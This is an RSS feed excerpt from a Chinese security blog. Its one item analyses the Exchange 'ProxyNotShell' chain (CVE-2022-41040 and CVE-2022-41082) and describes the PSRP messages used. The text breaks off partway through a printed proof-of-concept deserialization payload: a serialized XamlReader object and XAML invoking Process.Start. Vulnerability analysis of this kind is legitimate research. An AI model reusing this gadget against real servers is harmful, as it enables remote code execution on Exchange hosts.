<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>漏洞分析 on 可可的博客</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/</link><description>Recent content in 漏洞分析 on 可可的博客</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Wed, 08 Sep 2021 21:49:43 +0800</lastBuildDate><atom:link href="https://www.ch35tnut.site/zh-cn/vulnerability/index.xml" rel="self" type="application/rss+xml"/><item><title>Proxy Not Shell</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/proxy-not-shell/</link><pubDate>Fri, 05 May 2023 20:35:49 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/proxy-not-shell/</guid><description>漏洞环境 Windows Server 2019 Windows Exchange 2019 CU9 漏洞分析 漏洞链包含了两个漏洞：
CVE-2022-41040 Exchange 权限提升漏洞 CVE-2022-41082 Exchange 远程代码执行漏洞 CVE-2022-41040 是ProxyShell修复不完全的产物，在ProxyShell利用链中无需身份验证就可以通过autodiscover.json请求到/PowerShell接口，在CVE-2022-41040 中，仅需要低权限身份验证就可以请求到该接口，通过SSRF将低权限转换为高权限。
CVE-2022-41082是Exchange的反序列化漏洞，通过传入恶意序列化数据，使得Exchange触发能够造成代码执行的反序列化过程，将指定数据反序列化到恶意类，从而在Exchange服务器上执行任意代码。
在PoC中发送了以下三种类型的PSRP消息
0x00010002 SESSION_CAPABILITY
SESSION_CAPABILITY 应该是创建RunspacePool
0x00010004 INIT_RUNSPACEPOOL
INIT_RUNSPACEPOOL 应该是初始化RunspacePool
0x00021006 CREATE_PIPELINE
创建命令管道并在指定的 RunspacePool 中调用它
PoC通过PSRP协议创建了远程PowerShell管道，并试图在这个管道内执行New-OfflineAddressBook这个cmdlet，并将对应的序列化数据传给了Exchange。
PoC主要组成部分如下所示，BA标签内是base64编码的序列化System.UnitySerializationHolder对象
&amp;lt;Obj N=&amp;#34;V&amp;#34; RefId=&amp;#34;14&amp;#34;&amp;gt; &amp;lt;TN RefId=&amp;#34;2&amp;#34;&amp;gt; &amp;lt;T&amp;gt;System.ServiceProcess.ServiceController&amp;lt;/T&amp;gt; &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt; &amp;lt;/TN&amp;gt; &amp;lt;ToString&amp;gt;System.ServiceProcess.ServiceController&amp;lt;/ToString&amp;gt; &amp;lt;Props&amp;gt; &amp;lt;S N=&amp;#34;Name&amp;#34;&amp;gt;Type&amp;lt;/S&amp;gt; &amp;lt;Obj N=&amp;#34;TargetTypeForDeserialization&amp;#34;&amp;gt; &amp;lt;TN RefId=&amp;#34;2&amp;#34;&amp;gt; &amp;lt;T&amp;gt;System.Exception&amp;lt;/T&amp;gt; &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt; &amp;lt;/TN&amp;gt; &amp;lt;MS&amp;gt; &amp;lt;BA N=&amp;#34;SerializationData&amp;#34;&amp;gt;AAEAAAD/////AQAAAAAAAAAEAQAAAB9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAREYXRhCVVuaXR5VHlwZQxBc3NlbWJseU5hbWUBAAEIBgIAAAAgU3lzdGVtLldpbmRvd3MuTWFya3VwLlhhbWxSZWFkZXIEAAAABgMAAABYUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQs=&amp;lt;/BA&amp;gt; &amp;lt;/MS&amp;gt; &amp;lt;/Obj&amp;gt; &amp;lt;/Props&amp;gt; &amp;lt;S&amp;gt; &amp;lt;![CDATA[&amp;lt;ResourceDictionary xmlns=&amp;#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&amp;#34; xmlns:x=&amp;#34;http://schemas.microsoft.com/winfx/2006/xaml&amp;#34; xmlns:System=&amp;#34;clr-namespace:System;assembly=mscorlib&amp;#34; xmlns:Diag=&amp;#34;clr-namespace:System.Diagnostics;assembly=system&amp;#34;&amp;gt;&amp;lt;ObjectDataProvider x:Key=&amp;#34;LaunchCalch&amp;#34; ObjectType=&amp;#34;{x:Type Diag:Process}&amp;#34; MethodName=&amp;#34;Start&amp;#34;&amp;gt;&amp;lt;ObjectDataProvider.</description></item></channel></rss>